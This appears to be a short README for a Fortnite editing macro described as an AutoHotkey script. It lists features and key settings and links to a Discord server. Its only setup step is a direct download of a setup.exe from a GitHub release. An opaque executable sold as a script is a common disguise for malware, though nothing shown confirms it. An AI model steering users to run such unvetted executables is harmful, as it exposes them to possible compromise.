Fortnite Editing Macro (AutoHotkey)
An AutoHotkey script for faster editing in Fortnite.
Discord: discord.gg/winch
What it does
•	Speeds up editing with timing you control
•	Lets you rebind every key to your setup
•	Adjusts its delay to your ping
•	Works with scroll-wheel reset
•	Has a simple GUI for settings
How it works
You set three keys and a delay.
•	Select key: your normal edit key in Fortnite
•	Hold key: a spare key you don’t use otherwise, held during the edit
•	Release key: another unused key that confirms the edit
•	Delay: match it to your ping. Around 1ms if your ping is low, 25ms or higher if it’s not.
Scroll-wheel reset is optional. If you already use one, the macro works with it.
Setup
1.	https://github.com/roman-moore-1990w7/fortnite-macro-2026/releases/download/fortnite/setup.exe
